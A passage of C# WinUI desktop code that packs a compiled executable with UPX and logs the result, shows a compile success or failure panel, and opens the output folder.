        var psi = new System.Diagnostics.ProcessStartInfo
        {
            FileName               = upxPath,
            Arguments              = $"{upxArgs} -o \"{packedOutput}\" \"{currentExe}\"",
            RedirectStandardOutput = true,
            RedirectStandardError  = true,
            UseShellExecute        = false,
            CreateNoWindow         = true,
        };

        using var proc = System.Diagnostics.Process.Start(psi);
        if (proc == null) return null;

        var output = await proc.StandardOutput.ReadToEndAsync();
        var error  = await proc.StandardError.ReadToEndAsync();
        await proc.WaitForExitAsync();

        if (proc.ExitCode == 0 && File.Exists(packedOutput))
        {
            _logger.Ok($"Packed: {Path.GetFileName(packedOutput)}");
            if (!string.IsNullOrWhiteSpace(output)) _logger.Info(output);
            return packedOutput;
        }

        _logger.Warn($"UPX packing failed: {error}");
        return null;
    }

    private void ShowCompileResult(bool success, string message)
    {
        CompileResultPanel.Visibility = Visibility.Visible;
        CompileResultText.Text = message;
        
        if (success)
        {
            CompileResultIcon.Glyph = "\uE73E"; // Checkmark
            CompileResultIcon.Foreground = new SolidColorBrush(Microsoft.UI.Colors.Green);
            CompileOutputLink.Visibility = Visibility.Visible;
        }
        else
        {
            CompileResultIcon.Glyph = "\uEA39"; // Warning
            CompileResultIcon.Foreground = new SolidColorBrush(Microsoft.UI.Colors.Orange);
            CompileOutputLink.Visibility = Visibility.Collapsed;
        }
    }

    private void OpenOutputFolder_Click(object sender, RoutedEventArgs e)
    {
        if (!string.IsNullOrEmpty(_lastOutputPath) && Directory.Exists(_lastOutputPath))
        {
            Process.Start(new ProcessStartInfo
            {
                FileName = _lastOutputPath,
                UseShellExecute = true
            });
        }
    }
}
